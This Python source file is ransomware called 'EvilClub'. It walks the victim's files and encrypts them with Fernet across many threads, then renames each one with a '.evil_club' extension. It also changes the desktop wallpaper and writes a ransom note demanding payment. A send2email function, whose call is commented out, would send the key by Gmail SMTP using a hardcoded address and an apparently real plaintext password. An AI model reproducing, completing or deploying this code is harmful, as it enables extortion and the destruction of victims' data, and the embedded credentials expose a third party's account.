# from Crypto.Util import Counter
import base64
import os
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from tkinter import *
import discover, modify, smtplib
from time import sleep
import EvilClub_dec
from threading import Thread
import ctypes

class EvilClub_enc:

    def __init__(self):
        self.extention = discover.extensions
        self.thread_list = []

    def get_all_imgs(self):
        for img in os.listdir("Wallpaper"):
            yield "Wallpaper/"+img

    def thread_checker(self, times=1):
        counter = 0
        while 1:
            for thread in self.thread_list:
                if not thread.isAlive():
                    self.thread_list.remove(thread)
                    counter += 1
                    print("\r[+] counter {}".format(counter), end="")
            if counter == times:
                print("\rthreads {}".format(len(self.thread_list)), end="")
                # messagebox.showinfo("!done", "done with {} thread".format(counter))
                break

    def send2email(self):

        email = 'moh.shaer7731636@gmail.com'
        password = 'm0597731636'
        send_to_email = email
        subject = 'key'
        message = str(self.key)

        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = send_to_email
        msg['Subject'] = subject

        msg.attach(MIMEText(message, 'plain'))

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        text = msg.as_string()
        server.sendmail(email, send_to_email, text)
        server.quit()

    def changeDWallpaper(self, img='image.png'):
        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, img, 3)
        except:
            pass

    def encrypt(self, file_name):
        modify.encrypt(file_name, self.crypt.encrypt)
        try:
            os.rename(file_name, file_name+'.evil_club')
        except Exception as e:
            pass

    def finall_encrypt(self, img):
        try:
            self.encrypt(file_name=img)
        except Exception as e:
            pass

    def write_instractions(self):

        lines = [
            "Ass you can see we hacked you'r pc :(",
            "\n\n\nif you want to get back your file pay",
            "\n\n\nNo Money No Honey!",
            "\n\n\nThis is my gmail: youngeneral101@gmail.com",
            "\n\n\nYou Can Send Me File For Test!"
        ]
        try:
            with open('c:\\Users\\{}\\Desktop\\ReadME.txt'.os.getlogin()) as f:
                for line in lines:
                    f.write(lines)
                f.close()
        except:
            pass

    def key_checker(self):
        if not os.path.exists('key.key'):
            self.key = Fernet.generate_key()
            with open('key.key', 'w+b') as f:
                f.write(self.key)
                f.close()
        else:
            with open('key.key', 'r+b') as f:
                self.key = f.read()
                f.close()

    def run(self):
        try:
            self.changeDWallpaper()
        except:
            pass
        try:
            self.write_instractions()
        except:
            pass

        counter = 1

        self.key = Fernet.generate_key()

        try:
            self.key_checker()
            # self.send2email()
        except Exception as e:
            # self.key_checker()
            print('Error in saving the key!, {}'.format(e))

        imgs_file = discover.finall_discover()

        # ctr = Counter.new(128)

        # self.crypt = AES.new(self.key, AES.MODE_CTR, counter=ctr)

        self.crypt = Fernet(self.key)

        print("\n---------------------------------------------------------------------------\n")

        for img in imgs_file:
            t = Thread(target=self.finall_encrypt, args=([img]))
            t.start()
            sleep(0.1)
            self.thread_list.append(t)
            counter += 1
            if counter % 1 == 0:
                print("\rnow it's 10 thread :)", end="")
                self.thread_checker()
            counter+=1
            print('\r[+] Waiting for the  {} Thread to end :)'.format(counter), end='')

        print("\n\n---------------------------------------------------------------------------\n")
        print("\n[+] Done!, :)")
        EvilClub_dec.main()

        # startdirs = ['/']
        #
        # for currentDir in startdirs:
        #     for file in discover.discoverFiles(currentDir):
        #         modify.modify_file_inplace(file, crypt.encrypt)
        #         os.rename(file, file+'.bad_club') # append filename to indicate crypted

        # for one in range(100):
        #     # key = random(32)
        #     pass


        # if not decrypt:
        #     pass
        #      # post encrypt stuff
        #      # desktop picture
        #      # icon, etc


def main():

    evil_club_EvilClub_enc = EvilClub_enc()
    evil_club_EvilClub_enc.run()

if __name__=="__main__":
    main()